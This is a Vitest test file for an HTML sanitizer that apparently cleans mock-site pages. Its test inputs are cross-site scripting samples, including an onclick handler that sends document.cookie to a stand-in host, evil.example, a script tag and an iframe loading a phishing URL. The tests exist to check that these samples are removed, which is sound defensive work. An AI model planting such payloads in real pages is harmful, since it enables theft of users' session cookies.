import { describe, it, expect } from "vitest";
import { sanitizeMockSiteHtml } from "../src/index.js";

describe("sanitizeMockSiteHtml", () => {
  it("strips <script> tags entirely", () => {
    const dirty = `<html><body><h1>Hi</h1><script>alert(document.cookie)</script></body></html>`;
    const clean = sanitizeMockSiteHtml(dirty);
    expect(clean).not.toContain("<script");
    expect(clean).not.toContain("alert(");
    expect(clean).toContain("<h1>Hi</h1>");
  });

  it("strips inline event handler attributes", () => {
    const dirty = `<button onclick="fetch('https://evil.example/steal?c='+document.cookie)">Click</button>`;
    const clean = sanitizeMockSiteHtml(dirty);
    expect(clean).not.toContain("onclick");
    expect(clean).not.toContain("evil.example");
  });

  it("strips javascript: URLs", () => {
    const dirty = `<a href="javascript:alert(1)">Click</a>`;
    const clean = sanitizeMockSiteHtml(dirty);
    expect(clean).not.toContain("javascript:");
  });

  it("preserves ordinary structural markup and inline styles", () => {
    const clean = `<!DOCTYPE html><html><head><style>body{color:#111}</style></head><body><h1>Coastal Roofing Co</h1><p>Roof repair.</p></body></html>`;
    const result = sanitizeMockSiteHtml(clean);
    expect(result).toContain("Coastal Roofing Co");
    expect(result).toContain("Roof repair.");
    expect(result).toContain("color:#111");
  });

  it("drops <iframe> tags that could load off-page content", () => {
    const dirty = `<iframe src="https://evil.example/phish"></iframe>`;
    const clean = sanitizeMockSiteHtml(dirty);
    expect(clean).not.toContain("iframe");
    expect(clean).not.toContain("evil.example");
  });
});
